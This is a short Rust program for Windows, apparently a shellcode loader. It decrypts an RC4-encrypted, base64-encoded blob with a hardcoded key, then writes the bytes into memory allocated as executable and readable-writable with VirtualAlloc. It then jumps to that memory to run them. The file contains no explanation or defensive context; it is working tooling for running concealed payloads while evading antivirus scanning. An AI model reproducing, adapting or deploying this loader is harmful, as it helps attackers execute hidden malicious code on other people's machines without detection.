use crypto::rc4::Rc4;

use core::str;
use crypto::symmetriccipher::SynchronousStreamCipher;
use std::iter::repeat;

use std::mem::transmute;
use winapi::ctypes::c_void;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::VirtualAlloc;

fn main() {
    let bs4_string = "Vvsbl2t/+AWfrQAF1mfqZz8TXJ+st8QVqyUcWjuD7ZqZqbUOFQqkef8zKfQjFlxKnGe5aZz44h7zIBg01kmwGjctzbXjQVxriU8k5ktF08pny8fIUaLO1YDznraKQRlwtoZWioNr70jfQTXEahTxwo4UIwlTVN3nivW8Hjj6XpCR22utt/BvYrUyhpydEcW899Y7r9xb2VO2k8LlkGk8MNoMt0T7jrDpVUBgZ0V57T8TtwALJ+fPFYnhG4ZDoWiszo733xMYSngyBULnYo++3LEpWdeVjosmGj7LTD3jCO3LmNHFWurtQsGKqMV7naxJ8rE7GKVZaAo39PPbjqa+G7EnuFV3XaGl3Ng+M2MXcWkX/NTc";
    
    let key = "pRNtb343heAlnPFw5QiPHKxz3Z1dzLsqhiUyBNtTiI21DjUsZ0";

    let hex_string = dec(&bs4_string.to_string(), key);

    let buffer = &hex::decode(hex_string).expect("msg")[..];

    unsafe {
        let ptr = VirtualAlloc(std::ptr::null_mut(), buffer.len(), 0x00001000, 0x40);

        if GetLastError() == 0 {
            std::ptr::copy(buffer.as_ptr() as *const u8, ptr as *mut u8, buffer.len());

            let exec = transmute::<*mut c_void, fn()>(ptr);
            exec();
        }
    }
}

fn dec(bs4: &String, key: &str) -> String {
    let mut result = match base64::decode(bs4) {
        Ok(result) => result,
        _ => "".as_bytes().to_vec(),
    };

    let mut rc4 = Rc4::new(key.as_bytes());

    let mut outplain: Vec<u8> = repeat(0).take(result.len()).collect();

    rc4.process(&mut result[..], &mut outplain);

    hex::encode(&mut outplain)
}
